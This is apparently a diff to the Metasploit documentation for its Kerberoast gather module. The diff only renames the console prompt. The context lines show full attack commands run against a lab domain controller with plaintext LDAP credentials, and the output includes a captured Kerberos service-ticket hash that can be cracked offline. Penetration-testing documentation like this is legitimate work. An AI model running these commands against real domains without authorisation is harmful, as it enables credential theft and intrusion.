@@ -34,7 +34,7 @@ The hostname of the domain controller. Must be accurate otherwise the module wil
 To retrieve a TGS for a particular user, set `TARGET_USER`.
 
 ```msf
-msf6 auxiliary(gather/kerberoast) > run rhost=20.248.208.9 ldapdomain=msf.local ldappassword=PasswOrd123 ldapusername=AzureAdmin target_user=low.admin
+msf auxiliary(gather/kerberoast) > run rhost=20.248.208.9 ldapdomain=msf.local ldappassword=PasswOrd123 ldapusername=AzureAdmin target_user=low.admin
 [*] Running module against 20.248.208.9
 [+] 20.248.208.9:88 - Received a valid TGT-Response
 [*] 20.248.208.9:389 - TGT MIT Credential Cache ticket saved to /home/user/.msf4/loot/20250513155454_default_20.248.208.9_mit.kerberos.cca_656516.bin
@@ -48,7 +48,7 @@ $krb5tgs$17$low.admin$MSF.LOCAL$*http/abc.msf.local*$faf4a87156a49afd69de3c8b$58
 ### All users
 
 ```
-msf6 auxiliary(gather/kerberoast) > run rhost=20.248.208.9 ldapdomain=msf.local ldappassword=PasswOrd123 ldapusername=AzureAdmin
+msf auxiliary(gather/kerberoast) > run rhost=20.248.208.9 ldapdomain=msf.local ldappassword=PasswOrd123 ldapusername=AzureAdmin
 [*] Running module against 20.248.208.9
 
 [+] 20.248.208.9:88 - Received a valid TGT-Response
